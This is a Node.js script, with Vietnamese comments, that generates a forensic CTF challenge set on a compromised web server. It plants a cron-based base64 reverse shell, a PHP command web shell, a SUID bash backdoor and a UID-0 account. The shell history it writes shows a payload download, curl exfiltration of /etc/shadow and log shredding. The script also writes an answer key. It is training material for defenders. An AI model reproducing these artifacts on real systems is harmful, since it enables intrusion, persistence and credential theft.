/* Sinh MỘT cuộc điều tra sự cố có cốt truyện.
   Xuất: challenge-files/incident/<cây filesystem tang vật>
         server/flags.json · src/challenges.js · ANSWER-KEY.md */
const fs = require("fs"), path = require("path"), zlib = require("zlib");
const cyrb53 = (str, seed = 0) => { let h1=0xdeadbeef^seed,h2=0x41c6ce57^seed; for(let i=0,ch;i<str.length;i++){ch=str.charCodeAt(i);h1=Math.imul(h1^ch,2654435761);h2=Math.imul(h2^ch,1597334677);} h1=Math.imul(h1^(h1>>>16),2246822507);h1^=Math.imul(h2^(h2>>>13),3266489909);h2=Math.imul(h2^(h2>>>16),2246822507);h2^=Math.imul(h1^(h1>>>13),3266489909); return (4294967296*(2097151&h2)+(h1>>>0)).toString(16); };
const norm = (s) => { let x=String(s).trim().toLowerCase().replace(/\s+/g,""); const m=x.match(/^lsec\{(.*)\}$/); return m?m[1]:x; };

const SEED0 = (parseInt(process.env.CTF_SEED,10) || (Date.now() ^ (process.pid<<16))) % 2147483647 || 1337;
let SEED = SEED0;
const rnd = () => { SEED=(SEED*1103515245+12345)&0x7fffffff; return SEED/0x7fffffff; };
const ri = (a,b)=>a+Math.floor(rnd()*(b-a+1));
const pick = (a)=>a[Math.floor(rnd()*a.length)];
const shuffle = (a)=>{a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(rnd()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;};
const ip = ()=>`${pick([45,62,77,91,103,141,176,185,193,203,209])}.${ri(0,255)}.${ri(0,255)}.${ri(1,254)}`;
const intIp = ()=>`10.10.${ri(1,9)}.${ri(2,250)}`;
const users = ["alice","bob","carol","dave","erin","frank","grace","www-data","postgres","redis"];
const months=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug"];
const ts=()=>`${pick(months)} ${String(ri(1,28)).padStart(2," ")} ${String(ri(0,23)).padStart(2,"0")}:${String(ri(0,59)).padStart(2,"0")}:${String(ri(0,59)).padStart(2,"0")}`;
const b64=(s)=>Buffer.from(s).toString("base64"); const hexs=(s)=>Buffer.from(s).toString("hex");
const gz=(b)=>zlib.gzipSync(Buffer.isBuffer(b)?b:Buffer.from(b));
function mkTcp(src,dst,sp,dp,pl,t){const p=Buffer.from(pl);const eth=Buffer.from([0xaa,0xbb,0xcc,0,0,1,0xaa,0xbb,0xcc,0,0,2,0x08,0x00]);const i=Buffer.alloc(20);i[0]=0x45;i.writeUInt16BE(40+p.length,2);i.writeUInt16BE(ri(1,65535),4);i[6]=0x40;i[8]=64;i[9]=6;Buffer.from(src.split(".").map(Number)).copy(i,12);Buffer.from(dst.split(".").map(Number)).copy(i,16);const c=Buffer.alloc(20);c.writeUInt16BE(sp,0);c.writeUInt16BE(dp,2);c.writeUInt32BE(ri(1,4e9)>>>0,4);c.writeUInt32BE(ri(1,4e9)>>>0,8);c[12]=0x50;c[13]=0x18;c.writeUInt16BE(0xffff,14);return{t,buf:Buffer.concat([eth,i,c,p])};}
function pcap(pk){const g=Buffer.alloc(24);g.writeUInt32LE(0xa1b2c3d4,0);g.writeUInt16LE(2,4);g.writeUInt16LE(4,6);g.writeUInt32LE(65535,16);g.writeUInt32LE(1,20);const r=pk.map(p=>{const h=Buffer.alloc(16);h.writeUInt32LE(Math.floor(p.t),0);h.writeUInt32LE(p.buf.length,8);h.writeUInt32LE(p.buf.length,12);return Buffer.concat([h,p.buf]);});return Buffer.concat([g,...r]);}

// ── giá trị randomize của chiến dịch tấn công ──
const rUser=()=>pick(["deploy","gitlab","jenkins","backup","svc","oracle","tomcat","builder"]);
const atkIP=ip(), beaconC2=ip(), cronC2=ip();
const victim=rUser(); let backdoor=rUser(); while(backdoor===victim) backdoor=rUser();
const webshell=`${pick(["up","img","cache","tmp","media","assets"])}_${ri(1000,9999)}.php`;
const atkKey=pick(["root@kali","admin@parrot","hacker@blackarch","kali@kali","root@c2-node","operator@pwnbox"]);
const svc=pick(["sysupdate.service","cleanup.service","kworker.service","audit-helper.service","netmon.service"]);
const suid=pick(["/usr/lib/.x/bash","/var/backups/.cache/bash","/usr/local/lib/.sys/bash","/opt/.sysd/bash"]);
const payloadDom=`${pick(["evil","c2","malware","exfil","darknet","hydra"])}-${pick(["net","zone","hub","node"])}.${pick(["top","xyz","ru","cc","su"])}`;
const exfilFile=pick(["/etc/shadow","/etc/gshadow"]);
const shredLog=pick(["/var/log/auth.log","/var/log/syslog","/var/log/secure","/var/log/wtmp"]);
const handle=`${pick(["Dr","Mr","Agent","Ghost","Shadow","Null"])}${pick(["Nemesis","Void","Raven","Cipher","Wraith","Bane"])}${ri(10,99)}`;

// ── ghi cây filesystem ──
const ROOT = path.join(__dirname, "challenge-files", "incident");
fs.rmSync(path.join(__dirname,"challenge-files"), {recursive:true, force:true});
const w=(rel,data)=>{const p=path.join(ROOT,rel);fs.mkdirSync(path.dirname(p),{recursive:true});fs.writeFileSync(p,Buffer.isBuffer(data)?data:data+"\n");};


// auth.log
{ const L=[]; const targets=["root","admin",victim,"oracle","test","ubuntu"];
  for(let i=0;i<4200;i++){ const s=rnd()<0.7?atkIP:ip(); L.push(`${ts()} web sshd[${ri(2000,9999)}]: Failed password for ${rnd()<0.3?"invalid user ":""}${pick(targets)} from ${s} port ${ri(30000,60000)} ssh2`);}
  L.push(`${ts()} web sshd[${ri(2000,9999)}]: Accepted password for ${victim} from ${atkIP} port ${ri(30000,60000)} ssh2`);
  for(let i=0;i<30;i++) L.push(`${ts()} web sshd[${ri(2000,9999)}]: Accepted publickey for ${pick(users)} from ${intIp()} port ${ri(30000,60000)} ssh2`);
  w("var/log/auth.log", shuffle(L).join("\n")); }

// nginx access.log (web shell hits)
{ const L=[]; for(let i=0;i<1500;i++){ const s=rnd()<0.5?intIp():ip(); L.push(`${s} - - [10/Aug/2026:${String(ri(0,23)).padStart(2,"0")}:00:00 +0000] "${pick(["GET /","GET /index.php","GET /assets/app.js","POST /api/login","GET /favicon.ico"])} HTTP/1.1" ${pick(["200","302","404"])} ${ri(100,9000)}`);}
  for(let i=0;i<12;i++) L.push(`${atkIP} - - [10/Aug/2026:03:${String(ri(10,59)).padStart(2,"0")}:00 +0000] "POST /uploads/${webshell} HTTP/1.1" 200 ${ri(20,600)}`);
  w("var/log/nginx/access.log", shuffle(L).join("\n")); }

// audit.log with shred proctitle
{ const rows=[["apt","apt-get -y install nmap"],["systemctl",`systemctl enable ${svc}`],["cat","cat /etc/passwd"],["shred",`shred -u ${shredLog}`],["chmod","chmod +s "+suid],["wget",`wget http://${payloadDom}/p`]];
  const L=[]; for(const [c,cmd] of shuffle(rows)){ L.push(`type=SYSCALL msg=audit(${ri(1.7e9,1.8e9)}.${ri(100,999)}:${ri(100,999)}): comm="${c}" exe="/usr/bin/${c}" uid=0`); L.push(`type=PROCTITLE msg=audit(...): proctitle=${hexs(cmd)}`); L.push("----"); }
  w("var/log/audit/audit.log", L.join("\n")); }

w("var/log/syslog", Array.from({length:200},()=>`${ts()} web systemd[1]: Started ${pick(["Session","Daily apt","Cleanup","Timer"])} ${ri(1,99)}.`).join("\n"));

// etc/passwd + backdoor UID0
{ const L=["root:x:0:0:root:/root:/bin/bash","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin","bin:x:2:2:bin:/bin:/usr/sbin/nologin","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin","sshd:x:110:65534::/run/sshd:/usr/sbin/nologin","postgres:x:111:117::/var/lib/postgresql:/bin/bash"];
  for(const u of users) L.push(`${u}:x:${ri(1000,1099)}:${ri(1000,1099)}:${u}:/home/${u}:/bin/bash`);
  L.splice(ri(3,9),0,`${backdoor}:x:0:0:System:/home/${backdoor}:/bin/bash`);
  w("etc/passwd", L.join("\n")); }
w("etc/hostname","web-prod-01"); w("etc/os-release",'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"');
w("etc/ssh/sshd_config",["Port 22","PermitRootLogin yes","PasswordAuthentication yes","PubkeyAuthentication yes","X11Forwarding no"].join("\n"));

// cron persistence (base64 reverse shell -> cronC2)
const cronName=pick(["apache-sync","php-gc","systemd-update",".cache"]);
w(`etc/cron.d/${cronName}`,
  `# managed job\n*/5 * * * * root echo ${b64(`bash -i >& /dev/tcp/${cronC2}/9001 0>&1`)} | base64 -d | bash\n`);

// systemd malicious service
w(`etc/systemd/system/${svc}`,`[Unit]\nDescription=System Update Helper\n[Service]\nType=simple\nExecStart=/tmp/.x/update.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target`);

// root artifacts
{ const L=["ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI"+Math.random().toString(36).slice(2,10)+" admin@ops","ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI"+Math.random().toString(36).slice(2,10)+" backup@nas"];
  L.splice(ri(0,2),0,"ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB"+Math.random().toString(36).slice(2,10)+" "+atkKey);
  w("root/.ssh/authorized_keys", L.join("\n")); }
w("root/.bash_history",["id","uname -a","cd /tmp",`wget http://${payloadDom}/payload.sh`,"chmod +x payload.sh","./payload.sh",`useradd -o -u 0 -M ${backdoor}`,`curl -F file=@${exfilFile} http://${payloadDom}/up`,"systemctl daemon-reload",`systemctl enable ${svc}`,"history -c"].join("\n"));
w(`home/${victim}/.bash_history`,["ls","cd /var/www/html","git pull","php artisan cache:clear","exit"].join("\n"));

// web shell (chứa chữ ký giấu ở file .config.bak)
w(`var/www/html/uploads/${webshell}`,`<?php\n// generic file handler\nif(isset($_REQUEST['c'])){ system($_REQUEST['c']); }\n?>`);
w("var/www/html/index.php","<?php echo 'Acme Corp'; ?>");
{ const L=[]; const junk=["cache_ttl=3600","secret_key=changeme","db_host=127.0.0.1","debug=false"];
  for(let i=0;i<40;i++) L.push(rnd()<0.4?b64(pick(junk)+ri(1,99)):pick(junk));
  L.splice(ri(10,35),0,b64("signature:"+handle));
  w("var/www/html/.config.bak", L.join("\n")); }

// cắm binary SUID backdoor tại VỊ TRÍ THẬT (F8 tìm bằng: find / -perm -4000)
{ const rel=suid.replace(/^\//,""); w(rel,"#!/bin/sh\n# system helper\nexec /bin/bash \"$@\"\n"); fs.chmodSync(path.join(ROOT,rel),0o4755); }
// manifest: overlay artifact vào đúng đường dẫn thật khi mở terminal
{ const M=[["/var/log","var/log"],["/var/www","var/www"],["/opt","opt"],["/root","root"],["/home","home"],["/etc/passwd","etc/passwd"],["/etc/hostname","etc/hostname"],["/etc/ssh/sshd_config","etc/ssh/sshd_config"],[`/etc/cron.d/${cronName}`,`etc/cron.d/${cronName}`],["/etc/systemd/system","etc/systemd/system"],[suid,suid.replace(/^\//,"")]];
  fs.writeFileSync(path.join(__dirname,"challenge-files","mounts.txt"), M.map(x=>x[0]+"|"+x[1]).join("\n")+"\n"); }

// opt/capture.pcap — beacon mỗi 60s tới beaconC2
{ const p=[]; let t=1724650000; for(let i=0;i<1500;i++){t+=ri(0,3);p.push(mkTcp("10.10.5.20",rnd()<0.7?pick(["8.8.8.8","140.82.112.3","1.1.1.1"]):ip(),ri(30000,60000),443,`GET /a HTTP/1.1\r\nHost: cdn\r\n\r\n`,t));}
  let bt=1724650000; for(let i=0;i<40;i++){p.push(mkTcp("10.10.5.20",beaconC2,ri(50000,52000),443,`GET /b HTTP/1.1\r\nHost: c2\r\n\r\n`,bt));bt+=60;}
  w("opt/capture.pcap", pcap(p)); }

// ── objectives (mạch tấn công) ──
const OBJ = [
  {id:"F1",diff:"easy",title:"Điểm đột nhập",answer:atkIP,brief:`Cuộc tấn công bắt đầu bằng việc dò mật khẩu SSH. Trong hàng nghìn lần thử, có đúng một nguồn cuối cùng đăng nhập được. <b>Địa chỉ IP</b> của kẻ tấn công là gì?`},
  {id:"F2",diff:"easy",title:"Tài khoản bị chiếm",answer:victim,brief:`Chúng đã có chỗ đứng đầu tiên trên hệ thống. <b>Tài khoản</b> nào bị chiếm để đăng nhập thành công?`},
  {id:"F3",diff:"easy",title:"Cửa hậu UID 0",answer:backdoor,brief:`Không muốn phụ thuộc vào tài khoản vừa chiếm, kẻ tấn công tự tạo cho mình một lối vào bí mật với quyền cao nhất. <b>Tài khoản cửa hậu</b> đó tên gì?`},
  {id:"F4",diff:"medium",title:"Web shell",answer:webshell,brief:`Trên dịch vụ web, chúng thả lại một công cụ để điều khiển máy chủ từ xa qua trình duyệt. <b>Tên tệp</b> mã độc web đó là gì?`},
  {id:"F5",diff:"medium",title:"Khóa SSH cửa hậu",answer:atkKey,brief:`Để chắc chắn quay lại được kể cả khi mật khẩu bị đổi, chúng cấy một chìa khóa của riêng mình. <b>Danh tính</b> (comment) gắn với chìa khóa lạ đó là gì?`},
  {id:"F6",diff:"medium",title:"Cron gọi C2",answer:cronC2,brief:`Một tác vụ định kỳ được cài để liên tục gọi ngược về sở chỉ huy. <b>Địa chỉ IP</b> của máy chủ điều khiển (C2) mà nó kết nối tới?`},
  {id:"F7",diff:"medium",title:"Dịch vụ persistence",answer:svc,brief:`Kẻ tấn công ngụy trang mã độc thành một dịch vụ hệ thống để sống sót qua mỗi lần khởi động lại. <b>Tên dịch vụ</b> giả mạo đó?`},
  {id:"F8",diff:"medium",title:"Binary leo quyền",answer:suid,brief:`Chúng dựng sẵn một đường tắt để nhảy lên quyền root bất cứ lúc nào. <b>Đường dẫn</b> tệp thực thi bất thường được tạo cho mục đích này?`},
  {id:"F9",diff:"easy",title:"Nguồn payload",answer:payloadDom,brief:`Vũ khí của chúng không có sẵn trên máy — chúng kéo về từ hạ tầng riêng. <b>Tên miền</b> nguồn phát tán payload là gì?`},
  {id:"F10",diff:"hard",title:"Beacon C2",answer:beaconC2,brief:`Ngay lúc thu giữ, máy chủ vẫn đang lén liên lạc ra ngoài theo nhịp đều đặn. <b>Địa chỉ</b> ở đầu kia của kênh liên lạc bí mật đó?`},
  {id:"F11",diff:"hard",title:"Xóa dấu vết",answer:shredLog,brief:`Trước khi rút, kẻ tấn công cố phi tang bằng cách hủy một cuốn nhật ký. <b>Tệp log</b> nào đã bị xóa vĩnh viễn?`},
  {id:"F12",diff:"insane",title:"Chữ ký kẻ tấn công",answer:handle,brief:`Cuối cùng, chúng để lại một 'chữ ký' — biệt danh của mình — giấu kín trong hệ thống. <b>Biệt danh</b> của kẻ tấn công là gì?`},
];

const PTS={easy:100,medium:250,hard:500,insane:750};
const STORY=`Rạng sáng nay, máy chủ <b>web-prod-01</b> của Acme Corp bị xâm nhập. Bạn được cấp quyền truy cập CHỈ ĐỌC vào hệ thống để điều tra tại chỗ. Hãy tái dựng toàn bộ chuỗi tấn công — điểm đột nhập, chiếm tài khoản, cửa hậu, web shell, persistence, leo quyền, C2 và tuồn dữ liệu — và thu hồi <b>tất cả ${OBJ.length} flag</b>. Dùng lệnh Linux bình thường để khám phá /var/log, /etc, /root, /var/www, /opt ... như một chuyên gia forensic.`;

const flags={}, key=[];
for(const o of OBJ){ flags[o.id]={diff:o.diff,hash:cyrb53(norm(o.answer))}; key.push(`| ${o.id} | ${o.title} | ${o.diff} | \`${o.answer}\` |`); }
fs.mkdirSync(path.join(__dirname,"server"),{recursive:true});
fs.writeFileSync(path.join(__dirname,"server","flags.json"),JSON.stringify(flags,null,1));
fs.writeFileSync(path.join(__dirname,"server","objectives.json"),JSON.stringify({story:STORY,list:OBJ.map(o=>({id:o.id,title:o.title,brief:o.brief,diff:o.diff}))}));
const CATS=[{id:"F",name:"NHIỆM VỤ ĐIỀU TRA"}];
const CH=OBJ.map(o=>({id:o.id,cat:"F",diff:o.diff,title:o.title,brief:o.brief}));
fs.writeFileSync(path.join(__dirname,"src","challenges.js"),
`// TỰ SINH bởi gen.js — không sửa tay.\nexport const PTS=${JSON.stringify(PTS)};\nexport const CATS=${JSON.stringify(CATS)};\nexport const STORY=${JSON.stringify(STORY)};\nexport const CH=${JSON.stringify(CH)};\nexport const TOTAL_PTS=CH.reduce((s,c)=>s+PTS[c.diff],0);\n`);
fs.writeFileSync(path.join(__dirname,"ANSWER-KEY.md"),
`# ANSWER KEY — Điều tra sự cố (giữ kín)\n\nỔ tang vật ở ~/incident. ${OBJ.length} objective theo mạch tấn công.\n\n| ID | Objective | Độ khó | Đáp án |\n|----|-----------|--------|--------|\n${key.join("\n")}\n\n**SEED = ${SEED0}** — build với CTF_SEED=${SEED0} để tái tạo đúng vụ này.\n`);
console.log("generated incident:",OBJ.length,"objectives | SEED =",SEED0);
